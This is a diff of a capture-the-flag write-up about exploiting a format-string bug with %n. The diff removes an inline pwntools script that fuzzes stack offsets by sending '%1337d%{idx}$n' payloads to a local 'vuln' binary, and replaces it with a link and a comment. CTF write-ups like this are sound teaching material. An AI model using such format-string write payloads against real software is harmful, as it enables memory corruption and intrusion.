@@ -52,27 +52,7 @@ The one wrinkle is that we can't write any arbitrary data onto the stack itself:
 `%n` looks for a pointer to the location it should write, so we basically get to edit whatever 4 bytes we can find a pointer on the stack to.
 
 So that means we start our exploit development by looking for pointers on the stack.
-I actually whipped up a quick, dumb Python script to do that, leaning on the fact that Ghidra says the stack is 0x38 bytes deep:
-
-```py
-from pwn import *
-
-STONKS = str(1337)
-for idx in range(0x38):
-  with process(['./vuln']) as tube:
-    tube.recvuntil(b'portfolio\n')
-    tube.sendline(b'1')
-    tube.recvuntil(b'token?\n')
-    tube.sendline(f'%{STONKS}d%{idx}$n'.encode('utf-8'))
-    rest = tube.recv()
-    if b'Goodbye!' not in rest:
-      log.success(f"{idx} ({idx:x}) crashed:")
-    elif STONKS.encode('utf-8') in rest:
-      log.success(f"{idx} ({idx:x}) affected output:")
-    else:
-      log.failure(f"{idx} ({idx:x}) didn't crash:")
-    for line in rest.splitlines():
-      log.info(f"  {line!r}")
-```
+I actually whipped up a quick, dumb [Python script](./investigate.py) to do that, leaning on the fact that Ghidra says the stack is 0x38 bytes deep.
+It doesn't work that well; I'd have been better off writing a Ghidra script to examine the stack and how values off it are used.
 
 
